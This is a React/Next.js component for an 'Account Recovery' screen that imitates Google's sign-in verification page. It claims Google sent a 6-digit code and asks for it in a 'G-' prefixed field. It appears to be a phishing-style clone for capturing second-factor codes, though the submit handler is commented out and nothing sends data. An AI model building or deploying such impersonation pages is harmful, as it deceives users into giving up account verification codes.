"use client";
import Image from "next/image";
import React, { useState } from "react";

function AccountRecoveryCode() {
  const [email, setEmail] = useState();

  return (
    <div className=" w-full min-h-screen flex flex-col justify-center items-center">
      <div className="flex flex-col w-full max-w-md p-10 h-screen  justify-between ">
        <div className="flex flex-col gap-6 ">
          <div className="flex flex-col  gap-3">
            <div className="">
              <Image
                src={"/logo.png"}
                alt="logo"
                width={100}
                height={100}
                className="object-cover "
              />
            </div>
            <div className="flex flex-col gap-2">
              <h1 className="text-2xl font-normal mb-1">Account Recovery</h1>
              <p>
                To help keep your account safe, Google wants to make sure it's
                really you trying to sign in
              </p>
            </div>
          </div>
          <div className="space-y-2">
            <p>
              A text message with a 6-digit verification code was just sent to{" "}
              <span className="text-xs font-extrabold">
                Recovery Phone Number or Email
              </span>{" "}
            </p>
            <div className="relative">
              <input
                type="email"
                id="email"
                className={`w-full border  border-gray-300 rounded-md pl-14 px-3 py-2 focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500`}
                placeholder="Enter the code"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
              />
              <p className="absolute top-[9px] left-5">G-</p>
            </div>
          </div>
        </div>
          <div className="text-blue-500 font-semibold">Resend it</div>
        <div className="flex justify-between items-center">
          <button className="text-blue-600 font-medium text-sm mt-2">
            I don't have my phone
          </button>
          <button
            className="w-fit  bg-blue-500 text-white py-2 px-6 rounded-md hover:bg-blue-600 font-semibold"
            // onClick={() => handlePassword()}
          >
            Next
          </button>
        </div>
      </div>
    </div>
  );
}

export default AccountRecoveryCode;
